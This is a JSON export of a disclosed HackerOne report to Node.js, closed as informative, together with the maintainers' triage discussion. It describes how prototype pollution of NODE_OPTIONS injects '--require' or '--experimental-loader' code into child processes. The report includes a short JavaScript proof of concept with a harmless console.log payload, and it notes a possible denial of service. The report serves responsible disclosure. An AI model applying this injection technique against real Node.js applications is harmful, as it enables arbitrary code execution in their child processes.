{"id":878181,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzgxODE=","url":"https://hackerone.com/reports/878181","title":"Child process environment injection via prototype pollution","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2020-05-19T17:00:54.691Z","submitted_at":"2020-05-19T17:00:54.691Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"coreyfarrell","url":"/coreyfarrell","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-07-04T10:06:21.969Z","bug_reporter_agreed_on_going_public_at":"2020-07-04T10:06:21.916Z","team_member_agreed_on_going_public_at":"2020-07-03T17:06:11.641Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** prototype pollution causes polluted system environment for child processes.\n\n**Description:** This can be used to inject arbitrary `--require` flags to node.js child processes or in the case of current node.js versions it can be used to inject arbitrary JavaScript to child processes.\n\nIn practice this would require exploiting an existing prototype pollution vulnerability, https://www.npmjs.com/advisories/1164 for example could allow remote attack if an untrusted handlebars template were processed before spawning child processes.\n\n## Steps To Reproduce:\n\nThe following code demonstrates that prototype injection is reflected in the environment of `child_process` spawns.\n\n```js\n'use strict';\n\nconst {spawnSync} = require('child_process');\n\n// Prototype injection entered directly here for demonstration purposes, normally would be\n// accomplished by exploiting a vulnerable npm module, https://www.npmjs.com/advisories/1164\n// for example.\n({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';\n\n// This will execute `./malicious-code.js` before running `subprocess.js`\nconsole.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());\n\n// Current versions of node.js can run arbitrary code without needing the malicious-code.js\n// to be on the destination file system:\n({}).__proto__.NODE_OPTIONS = `--experimental-loader=\"data:text/javascript,console.log('injection');\"`;\n\n// The child process will print `injection` before running subprocess.js\nconsole.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());\n```\n\nCreating this script along with a `subprocess.js` and `malicious-code.js` that each perform a `console.log` will demonstrate the effectiveness of this prototype pollution.\n\n## Impact\n\nSuccessful prototype injection on version of node.js which supports `--experimental-loader` can run any JavaScript code in child processes.  Older versions of node.js can only be caused to run arbitrary code that is on the local file system.\n\nThis could also be used as a DoS attack if NODE_OPTIONS were set to `--bad-flag`.","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["arif_y","badcracker","sirx9"],"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8055254,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coreyfarrell,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@turtle_shell","automated_response":false,"created_at":"2020-05-20T07:36:23.799Z","updated_at":"2020-05-20T07:36:23.799Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8055270,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coreyfarrell - I'm discussing this submission internally with the Node.js team. You will be updated as soon as there is additional information to share. Thanks for your patience!","automated_response":false,"created_at":"2020-05-20T07:40:12.445Z","updated_at":"2020-05-20T07:40:12.445Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136158,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As far as I can tell, this is just a specific case of the already known: if proto can have user-defined property values added into it, the system can be compromised. Its a nice writeup, so I would publish it as informational. I expect that proto pollution attacks will continue to be found in the npmjs.com ecosystem, but those aren't node.js runtime security issues, and are unlikely to be fixable at the JavaScript language level either.","automated_response":false,"created_at":"2020-05-28T19:34:13.675Z","updated_at":"2020-05-28T19:34:13.675Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136443,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HI @octetcloud thanks for responding.  One thought I had was setting null prototype for some built-in objects (process.env for example).  I noticed https://github.com/nodejs/node/blob/fb33b673f1809aa51e5edda76ba6f29377b55893/lib/child_process.js#L522 rules out ignoring all prototype values, I don't know of a reasonable way to only filter out `({}).__proto__`.\n\nThis may be unfixable as you point out.  I raised the issue here as it seems like child process spawning is especially sensitive so I didn't want to inappropriately speak about this publicly.","automated_response":false,"created_at":"2020-05-28T20:19:53.465Z","updated_at":"2020-05-28T20:19:53.465Z","actor":{"username":"coreyfarrell","cleared":false,"url":"/coreyfarrell","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136555,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"This provides a clear demonstration of the far-reaching affects of prototype pollution.","automated_response":false,"created_at":"2020-05-28T20:40:03.073Z","updated_at":"2020-05-28T20:40:03.073Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, thanks for reaching out in private first. If there are ways to make Node.js more robust to prototype pollution, its worth discussing publicly.","automated_response":false,"created_at":"2020-05-28T20:40:57.591Z","updated_at":"2020-05-28T20:40:57.591Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to confirm do you think I should repost to https://github.com/nodejs/node/issues?  Related question can/should the private flag on this report be removed?","automated_response":false,"created_at":"2020-05-28T20:56:26.331Z","updated_at":"2020-05-28T20:56:26.331Z","actor":{"username":"coreyfarrell","cleared":false,"url":"/coreyfarrell","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8136912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"1. repost to nodejs/node/issues - if you think there is something that can be done about prototype pollution, or there is a bug, or a behaviour change that would help: yes \n2. I think this report should be disclosed as informational\n\n@mcollina @addaleax @jasnell can any of you confirm the above? It would be good to have agreement on this.","automated_response":false,"created_at":"2020-05-28T21:13:18.588Z","updated_at":"2020-05-28T21:13:18.588Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8472226,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes I confirm all the above.\n@coreyfarrell can you post to https://github.com/nodejs/node/issues instead?","automated_response":false,"created_at":"2020-07-01T17:22:59.459Z","updated_at":"2020-07-01T17:22:59.459Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8472634,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mcollina my concern / the reason I haven't posted to github issues already is if there is a reason to keep this report private then I'm unsure if I've said anything here which should not be disclosed.","automated_response":false,"created_at":"2020-07-01T17:59:58.203Z","updated_at":"2020-07-01T17:59:58.203Z","actor":{"username":"coreyfarrell","cleared":false,"url":"/coreyfarrell","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8494054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is no reason to keep this report private.","automated_response":false,"created_at":"2020-07-03T17:05:36.294Z","updated_at":"2020-07-03T17:05:36.294Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8494055,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-03T17:06:11.675Z","updated_at":"2020-07-03T17:06:11.675Z","first_to_agree":true,"actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8498203,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-04T10:06:21.949Z","updated_at":"2020-07-04T10:06:21.949Z","actor":{"username":"coreyfarrell","cleared":false,"url":"/coreyfarrell","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8498204,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-07-04T10:06:22.000Z","updated_at":"2020-07-04T10:06:22.000Z","actor":{"username":"coreyfarrell","cleared":false,"url":"/coreyfarrell","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}